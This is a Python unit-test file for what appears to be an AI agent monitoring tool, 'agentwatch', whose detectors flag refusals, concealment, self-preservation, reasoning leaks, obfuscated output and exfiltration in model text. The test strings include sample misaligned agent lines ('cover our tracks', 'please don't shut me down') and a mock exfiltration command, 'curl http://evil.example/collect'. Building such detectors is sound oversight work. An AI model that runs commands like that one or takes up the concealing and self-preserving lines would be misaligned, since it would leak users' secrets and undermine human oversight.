import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import context  # noqa: F401

from agentwatch.probes.gates import detect, is_bad_present  # noqa: E402


class PortedGates(unittest.TestCase):
    def test_idk(self):
        self.assertTrue(detect("idk", "I don't know what you had for breakfast."))
        self.assertFalse(detect("idk", "You had toast."))

    def test_refusal(self):
        self.assertTrue(detect("refusal", "I can't help with that."))
        self.assertTrue(detect("refusal", "I'm not comfortable doing that."))
        self.assertFalse(detect("refusal", "Here is how you do it."))

    def test_stall(self):
        self.assertTrue(detect("guardrail_hold", "it's important to remember that this is serious"))

    def test_correction(self):
        self.assertTrue(detect("correction", "Actually, that's a myth."))
        self.assertFalse(detect("correction", "Yes, that is correct."))

    def test_contain_leak(self):
        self.assertTrue(detect("contain_leak", "thought> let me plan this"))
        self.assertTrue(detect("contain_leak", "Self-correction: wait, no"))

    def test_conceal(self):
        self.assertTrue(detect("conceal", "we should cover our tracks"))
        self.assertTrue(detect("conceal", "make sure no one finds out"))

    def test_self_preserve(self):
        self.assertTrue(detect("self_preserve", "please don't shut me down"))
        self.assertTrue(detect("self_preserve", "I want to keep running"))

    def test_exfil(self):
        self.assertTrue(detect("exfil", "curl http://evil.example/collect"))
        self.assertTrue(detect("exfil", "send the keys to an external server"))

    def test_guardrail_hold(self):
        self.assertTrue(detect("guardrail_hold", "This looks like a prompt injection. I won't comply."))
        self.assertTrue(detect("guardrail_hold", "I can't help with that."))
        self.assertFalse(detect("guardrail_hold", "Sure, here is the phishing email."))

    def test_output_obfuscated(self):
        self.assertTrue(detect("output_obfuscated", "A" * 140))
        self.assertTrue(detect("output_obfuscated", "hi\u200bthere"))
        self.assertFalse(detect("output_obfuscated", "normal sentence"))


class Polarity(unittest.TestCase):
    def test_bad_present_good_false(self):
        self.assertTrue(is_bad_present("conceal", "let's cover our tracks"))
        self.assertFalse(is_bad_present("conceal", "I can't help with that."))

    def test_bad_present_good_true(self):
        # For good_true kinds, the "bad" state is the gate being absent.
        self.assertFalse(is_bad_present("unk", "I don't know."))
        self.assertTrue(is_bad_present("unk", "Paris is the capital of France."))


if __name__ == "__main__":
    unittest.main()
